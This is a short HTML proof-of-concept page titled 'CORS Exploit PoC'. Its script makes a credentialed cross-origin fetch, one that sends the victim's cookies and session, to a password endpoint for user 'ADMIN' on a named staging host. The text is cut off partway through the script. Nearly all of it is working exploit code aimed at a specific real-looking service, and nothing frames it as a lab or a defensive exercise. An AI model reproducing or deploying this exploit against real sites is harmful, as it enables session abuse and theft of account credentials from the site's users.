<!DOCTYPE html>
<html>

  <title>CORS Exploit PoC</title>
</head>
<body>
  <h2>CORS Exploit Demo</h2>
  <div id="output">Waiting for response...</div>

  <script>
    var targetUrl = "https://appdevelopers-stg.t-mobile.com/user/password?name=ADMIN";

    fetch(targetUrl, {
      method: "GET",
      credentials: "include" // include victim's cookies/session
    })
